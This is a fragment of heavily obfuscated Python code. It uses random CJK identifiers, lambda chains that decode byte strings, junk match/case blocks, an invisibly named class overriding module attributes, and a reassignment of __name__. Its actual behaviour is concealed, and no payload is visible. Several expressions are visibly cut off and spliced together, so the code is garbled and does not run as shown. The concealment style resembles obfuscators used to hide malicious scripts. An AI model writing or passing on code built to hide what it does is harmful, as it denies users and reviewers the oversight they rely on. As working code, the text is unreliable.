            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())())
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))()]))))())())())
            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())())
            __import__('urllib.parse').parse.urlparse
        except Exception as e:
            raise ImportError((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(str(e)))
try:
    match '錻駏釶堵谙償' == '鮀掔鶣睵蘚粖':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            礓瞫沌甃攅淀 = [[True], [False]]
            暽掇財豥硿淳(['捓煐鹛髌櫮轟'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 痝鬼仇誖瞃栌:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                鞸戺拂污蠕鋶 = [[(lambda: (lambda 攨拾怚複闯锳: 攨拾怚複闯锳 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 慧尩返依睺雘: 慧尩返依睺雘 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 帥搘蛸幚蝝瑟:
        old__name__ = __name__
try:
    match '藽嗬禅筎訩糬' == '恩頯奦漘哺歩':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            刘鞄氝栠餳澑 = [[True], [False]]
            暽掇財豥硿淳(['謾仰櫪馎怈抑'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 誮扚氈饾夽亹:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                嚐訿相噖棴椦 = [[(lambda: (lambda 谏約狕蜶胦竧: 谏約狕蜶胦竧 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 垞襢垣矺鷆燝: 垞襢垣矺鷆燝 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 榦褂缻佂隫穯:
        __name__ = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()
try:
    match '菈秙斶艕婗蕶' == '坿偤鳿柋娋壳':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            獣縪蛶鰂侫礹 = [[True], [False]]
            暽掇財豥硿淳(['苂觀頕濥涷璃'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 卫艟鰓臐囟論:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                襔砈哷岭兓巧 = [[(lambda: (lambda 鸖旰騠鴪掅彦: 鸖旰騠鴪掅彦 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 烉燥弤凖揶尓: 烉燥弤凖揶尓 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 褐夎皇鹥姧燮:

        class ᅠ:

            def __init__(self, **kwargs):
                self.__dir__ = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).__dir__
                return None

            @property
            def __dict__(self):
                return 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).__dict__

            @property
            def __spec__(self):
                return 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).__spec__

            def __call__(self, *args, **kwargs):
                raise TypeError((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x03'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 